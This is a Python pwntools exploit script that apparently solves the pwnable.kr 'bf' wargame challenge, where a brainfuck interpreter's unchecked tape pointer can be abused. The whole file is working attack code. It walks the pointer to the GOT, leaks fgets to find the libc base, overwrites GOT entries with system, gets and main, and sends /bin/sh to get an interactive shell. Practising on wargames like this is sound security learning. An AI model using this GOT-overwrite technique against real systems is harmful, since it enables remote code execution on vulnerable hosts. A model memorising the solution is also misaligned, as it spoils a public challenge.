from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"


binary_name = "bf"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)
# libc = ELF("./bf_libc.so")
# libc=e.libc
context.binary = e

def writeValue(target_value,p):
    # Assumes P currently points to the MSB (which in memory appears as the LSB). Start overwriting from there. 

    MSB = (target_value >> 24) & 0xFF  # Most Significant Byte
    BYTE_2 = (target_value >> 16) & 0xFF
    BYTE_3 = (target_value >> 8) & 0xFF
    LSB = target_value & 0xFF  # Least Significant Byte


    payload= [ p8(MSB) , p8(BYTE_2) , p8(BYTE_3) , p8(LSB) ]
    for byte in payload:
        p.send(byte)


def main():
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
        libc=e.libc
    else:
        if(sys.argv[1] == "remote"):
            libc = ELF("./bf_libc.so")
            p= remote("pwnable.kr",9001)
        elif(sys.argv[1] == "gdb"):
            libc=e.libc
            p = gdb.debug(f"./{binary_name}", gdbscript="c", aslr=False)
        else:
            print("Running locally")
            libc=e.libc
            p = process(f"./{binary_name}")

    p.recvlines(2)
    read_4_bytes = b".<.<.<."
    write_4_bytes = b",<,<,<,"
    back_to_MSB=b">>>"


    fgets_GOT= 0x0804A010;
    pointer_initial= 0x0804a0a0; # the initial value P points to (start of tape)

# 

    offset_P_fgets = pointer_initial - fgets_GOT -3; # leak MSB first
    offset_fgets_memset =28
    offset_fgets_putchar=32

    payload = offset_P_fgets*b"<"+ read_4_bytes  +back_to_MSB + write_4_bytes +back_to_MSB+  b">" *offset_fgets_memset + write_4_bytes + back_to_MSB + b"<" *offset_fgets_memset+ b">" * offset_fgets_putchar +write_4_bytes + b"."

        # offset_fgets_memset and getchar followed by subsequent writes respectively + b","

    p.sendline(payload)
    log.success(f"Payload: |||| START\n {payload} \nEND|||| was sent!\nWaiting...")
    time.sleep(2)

    fgets_leak = u32(p.recv(4),endian='big'); # 4 bytes representing fgets address

    libc.address = fgets_leak - libc.sym['fgets']
    log.success(f'LIBC base: {hex(libc.address)}')

    

    writeValue(libc.sym['system'],p)
    writeValue(libc.sym['gets'],p)
    writeValue(e.sym['main'],p)


    log.success(f"Redirecting back to main... ({hex(e.sym['main'])})")

    # send /bin/sh
    p.sendline(b"/bin/sh")
    p.interactive()

main()
